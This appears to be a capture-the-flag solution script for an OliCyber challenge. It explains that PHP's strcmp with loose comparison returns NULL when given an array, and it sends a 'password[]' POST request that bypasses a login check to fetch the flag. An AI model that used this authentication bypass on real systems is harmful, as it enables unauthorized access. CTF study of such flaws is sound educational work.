#!/usr/bin/env python3
"""
This challenge requires basic understanding of php's strcmp function.
Reference: https://www.php.net/manual/en/function.strcmp.php

Basically it was just comparing user input with already defined password. 
if (strcmp($_POST['password'], $password) == 0) {
          echo $FLAG;
}

strcmp in this case does Loose comparison (==) which by nature is not secure.
To solve the challenge one would do a POST request in which the password variable is an empty array and not a string. It is an unexpected input and therefore php returns NULL which is equal to 0.
"""
import requests
url = "http://clogin.challs.olicyber.it/"
print(requests.post(url, data={'password[]': ''}).text)
